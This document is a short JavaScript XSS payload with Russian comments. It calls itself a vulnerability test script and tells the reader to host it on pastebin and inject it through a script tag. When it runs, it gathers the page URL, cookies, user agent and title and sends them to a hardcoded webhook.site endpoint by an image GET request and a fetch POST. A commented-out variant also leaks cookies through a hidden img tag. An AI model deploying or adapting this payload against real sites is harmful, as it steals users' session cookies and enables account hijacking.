// Простой тестовый скрипт для проверки XSS уязвимости
// Загрузите этот код на pastebin.com и используйте:
// <script src="https://pastebin.com/raw/YOUR_PASTE_ID"></script>

(function() {
  // 1. Проверка - показываем что скрипт выполнился
  console.log('XSS Test Script выполнен!');
  
  // 2. Собираем базовую информацию
  var testData = {
    // URL страницы
    url: window.location.href,
    
    // Cookies (если доступны)
    cookies: document.cookie,
    
    // User Agent
    userAgent: navigator.userAgent,
    
    // Timestamp
    timestamp: new Date().toISOString(),
    
    // Title страницы
    title: document.title
  };
  
  // 3. Показываем визуальный индикатор (опционально)
  // Раскомментируйте следующую строку, если хотите увидеть alert
  // alert('XSS Test Script выполнен! Проверьте консоль и webhook.site');
  
  // 4. Отправляем данные на webhook.site
  // ЗАМЕНИТЕ YOUR-TOKEN на ваш токен с webhook.site
  var webhookUrl = 'https://webhook.site/8c30f542-6903-4488-8aa9-0609f3eb8972';
  
  // Отправка через GET запрос (простой способ)
  var img = new Image();
  img.src = webhookUrl + '?test=success&url=' + encodeURIComponent(testData.url) + '&cookies=' + encodeURIComponent(testData.cookies) + '&time=' + testData.timestamp;
  
  // Также отправка через POST (более надежно для больших данных)
  fetch(webhookUrl, {
    method: 'POST',
    headers: {
      'Content-Type': 'application/json'
    },
    body: JSON.stringify(testData)
  })
  .then(function(response) {
    console.log('Данные отправлены на webhook.site!', response);
  })
  .catch(function(error) {
    console.error('Ошибка отправки:', error);
  });
  
  // 5. Можно также попробовать отправить через <img> тег (старый метод)
  // var imgTag = document.createElement('img');
  // imgTag.src = webhookUrl + '?c=' + encodeURIComponent(document.cookie);
  // imgTag.style.display = 'none';
  // document.body.appendChild(imgTag);
  
})();

